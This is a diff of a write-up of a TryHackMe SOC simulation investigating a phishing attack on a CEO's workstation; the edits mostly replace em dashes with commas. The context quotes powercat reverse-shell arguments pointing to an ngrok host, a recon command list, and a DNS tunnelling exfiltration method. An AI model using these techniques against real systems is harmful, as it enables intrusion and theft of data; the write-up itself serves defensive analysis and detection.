@@ -1,8 +1,8 @@
-# Phishing Unfolding — SOC Alert Triage and Incident Investigation
+# Phishing Unfolding, SOC Alert Triage and Incident Investigation
 
 ## Environment
 
-**Platform:** TryHackMe — Phishing Unfolding (SOC Simulation)
+**Platform:** TryHackMe, Phishing Unfolding (SOC Simulation)
 
 **SIEM:** Splunk (`index=main`, `sourcetype=_json`, `source=eventcollector`)
 
@@ -16,7 +16,7 @@
 
 ## Lab Objective
 
-Triage a live queue of SOC alerts generated during an unfolding phishing campaign against a corporate environment. Identify, investigate, and document the full attack chain in real time while processing false positive noise from undertunned detection rules — mirroring the dual-track workload of a real Security Operations Center.
+Triage a live queue of SOC alerts generated during an unfolding phishing campaign against a corporate environment. Identify, investigate, and document the full attack chain in real time while processing false positive noise from undertunned detection rules, mirroring the dual-track workload of a real Security Operations Center.
 
 ---
 
@@ -24,10 +24,10 @@ Triage a live queue of SOC alerts generated during an unfolding phishing campaig
 
 | Tool | Role |
 |---|---|
-| Splunk | SIEM — log querying, event correlation, timeline reconstruction |
-| Sysmon | Endpoint telemetry — process creation, file creation, DNS queries |
-| Email logs | Phishing delivery visibility — sender, recipient, attachment, content |
-| TryDetectThis | IOC reputation scoring — domain, email, and URL threat intelligence |
+| Splunk | SIEM, log querying, event correlation, timeline reconstruction |
+| Sysmon | Endpoint telemetry, process creation, file creation, DNS queries |
+| Email logs | Phishing delivery visibility, sender, recipient, attachment, content |
+| TryDetectThis | IOC reputation scoring, domain, email, and URL threat intelligence |
 
 ---
 
@@ -37,7 +37,7 @@ Triage a live queue of SOC alerts generated during an unfolding phishing campaig
 
 The alert queue in this simulation operated on two parallel tracks that had to be separated early to work efficiently.
 
-**Track 1 — Detection Rule Noise**
+**Track 1, Detection Rule Noise**
 
 Two detection rules generated the majority of alerts in the queue and required consistent False Positive triage throughout the simulation.
 
@@ -62,9 +62,9 @@ index=main sourcetype=_json source=eventcollector
 
 ![](../images/SOC-Simulator/4.png)
 
-The rule should be augmented with content-based signals — financial requests, urgency language, credential harvesting patterns — and cross-referenced against recipient validity before firing.
+The rule should be augmented with content-based signals, financial requests, urgency language, credential harvesting patterns, and cross-referenced against recipient validity before firing.
 
-**Track 2 — The Incident Chain**
+**Track 2, The Incident Chain**
 
 Running beneath the noise was a complete phishing-to-exfiltration attack chain targeting the CEO's workstation. This is documented in full below.
 
@@ -72,11 +72,11 @@ Running beneath the noise was a complete phishing-to-exfiltration attack chain t
 
 ### Incident Investigation
 
-#### Phase 1 — Initial Access
+#### Phase 1, Initial Access
 
-**MITRE T1566.001 — Spearphishing Attachment**
+**MITRE T1566.001, Spearphishing Attachment**
 
-At 06:35:00, a phishing email was delivered to `michael.ascot@tryhatme.com` from `john@hatmakereurope.xyz`. The email used a business email compromise lure — an overdue payment notice with imminent account suspension and legal action threats — designed to pressure an executive into opening the attachment immediately. The attached file was `ImportantInvoice-Febrary.zip`, containing a deliberate typo in the filename ("Febrary") consistent with phishing artifact tradecraft.
+At 06:35:00, a phishing email was delivered to `michael.ascot@tryhatme.com` from `john@hatmakereurope.xyz`. The email used a business email compromise lure, an overdue payment notice with imminent account suspension and legal action threats, designed to pressure an executive into opening the attachment immediately. The attached file was `ImportantInvoice-Febrary.zip`, containing a deliberate typo in the filename ("Febrary") consistent with phishing artifact tradecraft.
 
 ![](../images/SOC-Simulator/3.png)
 
@@ -90,12 +90,12 @@ index=main sourcetype=_json source=eventcollector recipient="michael.ascot@tryha
 
 ![](../images/SOC-Simulator/5.png)
 
-The query returned the phishing email at 06:35:00, establishing it as the earliest event in the attack chain. Domain and sender reputation checks on TryDetectThis returned clean scores — consistent with freshly registered or low-profile attacker infrastructure not yet indexed by threat intelligence feeds.
+The query returned the phishing email at 06:35:00, establishing it as the earliest event in the attack chain. Domain and sender reputation checks on TryDetectThis returned clean scores, consistent with freshly registered or low-profile attacker infrastructure not yet indexed by threat intelligence feeds.
 
 At 06:45, Sysmon event code 1 recorded Outlook launching on win-3450 with the `/eml` flag:
 
 ```
-OUTLOOK.EXE parent: OUTLOOK.EXE — "C:\Program Files\Microsoft Office\Root\Office16\OUTLOOK.EXE" /eml
+OUTLOOK.EXE parent: OUTLOOK.EXE, "C:\Program Files\Microsoft Office\Root\Office16\OUTLOOK.EXE" /eml
 ```
 
 ![](../images/SOC-Simulator/6.png)
@@ -110,9 +110,9 @@ The `/eml` switch confirms Michael Ascot opened the phishing email directly, tri
 
 ---
 
-#### Phase 2 — Execution
+#### Phase 2, Execution
 
-**MITRE T1059.001 — PowerShell | MITRE T1105 — Ingress Tool Transfer**
+**MITRE T1059.001, PowerShell | MITRE T1105, Ingress Tool Transfer**
 
 At 06:55:19, Sysmon recorded a PowerShell process (PID 9060) spawned by `explorer.exe` executing the following command:
 
@@ -122,7 +122,7 @@ At 06:55:19, Sysmon recorded a PowerShell process (PID 9060) spawned by `explore
 
 ![](../images/SOC-Simulator/7.png)
 
-This command uses `Invoke-Expression` (IEX) to download and execute `powercat.ps1` directly into memory from GitHub, bypassing disk-based antivirus detection entirely. Powercat is a PowerShell-native netcat equivalent. The `-c 2.tcp.ngrok.io -p 19282 -e powershell` arguments establish a reverse shell back to attacker-controlled infrastructure tunneled through ngrok — a legitimate service used here to bypass egress firewall rules by disguising C2 traffic as outbound HTTPS.
+This command uses `Invoke-Expression` (IEX) to download and execute `powercat.ps1` directly into memory from GitHub, bypassing disk-based antivirus detection entirely. Powercat is a PowerShell-native netcat equivalent. The `-c 2.tcp.ngrok.io -p 19282 -e powershell` arguments establish a reverse shell back to attacker-controlled infrastructure tunneled through ngrok, a legitimate service used here to bypass egress firewall rules by disguising C2 traffic as outbound HTTPS.
 
 At 06:55:20, Sysmon event code 11 recorded a file creation in the temp directory:
 
@@ -147,18 +147,18 @@ index=main sourcetype=_json source=eventcollector host.name="win-3450"
 
 ---
 
-#### Phase 3 — Reconnaissance
+#### Phase 3, Reconnaissance
 
-**MITRE T1082 — System Information Discovery | MITRE T1033 — System Owner/User Discovery | MITRE T1069 — Permission Groups Discovery | MITRE T1087 — Account Discovery**
+**MITRE T1082, System Information Discovery | MITRE T1033, System Owner/User Discovery | MITRE T1069, Permission Groups Discovery | MITRE T1087, Account Discovery**
 
 Immediately after establishing the reverse shell, the attacker executed a standard post-exploitation reconnaissance sequence through the active PowerShell session between 06:55:35 and 06:56:04:
 
 ```
-systeminfo.exe          — full system enumeration (OS, hardware, domain, hotfixes)
-whoami.exe              — current user context
-whoami.exe /priv        — privilege enumeration
-net.exe user            — local user account listing
-net.exe localgroup      — local group membership listing
+systeminfo.exe         - full system enumeration (OS, hardware, domain, hotfixes)
+whoami.exe             - current user context
+whoami.exe /priv       - privilege enumeration
+net.exe user           - local user account listing
+net.exe localgroup     - local group membership listing
 ```
 
 ![](../images/SOC-Simulator/8.png)
@@ -170,9 +170,9 @@ At 06:56:30, Sysmon event code 11 recorded PowerShell (PID 9060) writing `PowerV
 
 ---
 
-#### Phase 4 — Lateral Movement
+#### Phase 4, Lateral Movement
 
-**MITRE T1021.002 — SMB/Windows Admin Shares**
+**MITRE T1021.002, SMB/Windows Admin Shares**
 
 At 06:58:25, the attacker mapped the financial records share from the internal file server directly to a local drive letter through the active PowerShell session:
 
@@ -182,7 +182,7 @@ At 06:58:25, the attacker mapped the financial records share from the internal f
 
 ![](../images/SOC-Simulator/9-1png.png)
 
-The share name `SSF-FinancialRecords` indicates sensitive financial data. The target was identified specifically — either through PowerView AD enumeration in the previous phase or prior knowledge of the environment. The working directory at the time of execution was `C:\Users\michael.ascot\downloads\`, confirming the attacker was operating entirely within the compromised user's context.
+The share name `SSF-FinancialRecords` indicates sensitive financial data. The target was identified specifically, either through PowerView AD enumeration in the previous phase or prior knowledge of the environment. The working directory at the time of execution was `C:\Users\michael.ascot\downloads\`, confirming the attacker was operating entirely within the compromised user's context.
 
 FILESRV-01 had no Sysmon coverage of its own. The lateral movement to the file server is only visible through win-3450's telemetry, representing a significant detection blind spot in the environment.
 
@@ -192,9 +192,9 @@ FILESRV-01 had no Sysmon coverage of its own. The lateral movement to the file s
 
 ---
 
-#### Phase 5 — Collection
+#### Phase 5, Collection
 
-**MITRE T1074.001 — Local Data Staging**
+**MITRE T1074.001, Local Data Staging**
 
 At 06:59:12, Robocopy was invoked from the mapped network share to stage the entire contents locally:
 
@@ -220,9 +220,9 @@ This post-staging cleanup step removed the mapped drive to reduce forensic artif
 
 ---
 
-#### Phase 6 — Exfiltration
+#### Phase 6, Exfiltration
 
-**MITRE T1048.003 — Exfiltration Over Alternative Protocol: DNS**
+**MITRE T1048.003, Exfiltration Over Alternative Protocol: DNS**
 
 At 07:00, the attacker executed a series of `nslookup.exe` processes spawned by `powershell.exe` (PID 3728) from `C:\Users\michael.ascot\downloads\exfiltration\`:
 
@@ -237,7 +237,7 @@ At 07:00, the attacker executed a series of `nslookup.exe` processes spawned by 
 
 ![](../images/SOC-Simulator/11.png)
 
-The subdomains preceding `.haz4rdw4re.io` are Base64-encoded chunks of the staged financial data. The technique works by encoding file contents in Base64, splitting the output into fixed-length chunks, and issuing each chunk as a DNS query subdomain to an attacker-controlled domain. The attacker's authoritative DNS server logs every incoming query, reassembles the chunks in order, and decodes the Base64 to reconstruct the original files — all without a single byte of data leaving the network over a monitored protocol.
+The subdomains preceding `.haz4rdw4re.io` are Base64-encoded chunks of the staged financial data. The technique works by encoding file contents in Base64, splitting the output into fixed-length chunks, and issuing each chunk as a DNS query subdomain to an attacker-controlled domain. The attacker's authoritative DNS server logs every incoming query, reassembles the chunks in order, and decodes the Base64 to reconstruct the original files, all without a single byte of data leaving the network over a monitored protocol.
 
 Decoding the subdomains confirmed the exfiltrated content included at minimum `Summary.xls` (a financial spreadsheet) and a `.pptx` presentation file from the financial records share. The final chunk ends with `==`, the Base64 padding marker indicating the end of the encoded stream. Ten Sysmon alerts were generated across the full DNS tunneling sequence, one per nslookup invocation.
 
@@ -259,9 +259,9 @@ At 07:00:35, the reverse shell was re-established twice via the same powercat co
 
 FILESRV-01 had no Sysmon coverage. The lateral movement to the financial records share and the full scope of data accessed are only visible through the originating host's telemetry. In a real environment this would severely limit the ability to assess the blast radius of the breach. Sysmon deployment should be treated as a baseline requirement across all servers, not just workstations.
 
-DNS tunneling went undetected until process telemetry revealed nslookup spawned by PowerShell from an exfiltration staging directory. A DNS-layer monitoring solution inspecting query frequency, subdomain entropy, and query length would have flagged `haz4rdw4re.io` traffic before exfiltration completed. Long Base64-encoded subdomains have high entropy and abnormal length — both detectable without deep packet inspection.
+DNS tunneling went undetected until process telemetry revealed nslookup spawned by PowerShell from an exfiltration staging directory. A DNS-layer monitoring solution inspecting query frequency, subdomain entropy, and query length would have flagged `haz4rdw4re.io` traffic before exfiltration completed. Long Base64-encoded subdomains have high entropy and abnormal length, both detectable without deep packet inspection.
 
-The two undertunned detection rules generated significant noise throughout the simulation. In a real SOC, alert fatigue from consistent false positives on known-benign Windows behaviors creates the conditions under which real incidents are missed or deprioritized. Rule tuning is not a cosmetic improvement — it is a direct operational security requirement.
+The two undertunned detection rules generated significant noise throughout the simulation. In a real SOC, alert fatigue from consistent false positives on known-benign Windows behaviors creates the conditions under which real incidents are missed or deprioritized. Rule tuning is not a cosmetic improvement, it is a direct operational security requirement.
 
 **Attacker tradecraft observations:**
 
@@ -284,4 +284,4 @@ The use of fileless execution via IEX prevented PowerShell payload from touching
 
 ---
 
-*— End of Write-Up —*
+*End of Write-Up*
